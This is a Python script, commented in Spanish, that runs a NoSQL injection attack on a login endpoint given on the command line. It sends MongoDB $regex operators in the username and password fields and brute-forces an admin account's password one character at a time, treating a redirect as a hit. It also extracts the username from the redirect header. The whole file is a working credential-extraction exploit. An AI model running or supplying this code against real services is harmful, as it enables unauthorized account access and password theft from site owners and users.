import requests
import json
import time
import sys

dictionary = '.+*<>{}\\~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()_,;:[]-_'

username = ''  # Variable global para almacenar el username

def getNextChars(url, pfx=''):
    global username  # Utilizamos la variable global
    resp = []
    s = requests.Session()
    for ch in dictionary:
        if ch in '.,+*\\[]{}()':
            ch = '\\' + ch
        params = {
            'username': { "$regex": "admin.*" },
            'password': { "$regex": '^' + pfx + ch + '.*' },
        }
        headers = {
            'content-type': 'application/json'
        }
        
        r = s.post(url, headers=headers, data=json.dumps(params), allow_redirects=False)

        if 'Location' in r.headers:
            if ch == '$' and len(resp) == 0:
                return
            username = r.headers['Location'].split('=')[1]
            resp.append(pfx + ch)
            break
    
    if resp:
        print(f"Encontrado: {resp[0]}")
        for r in resp:
            getNextChars(url, r)

    return resp

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python script.py <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    getNextChars(url)
    
    if username:
        print(f"Username: {username}")
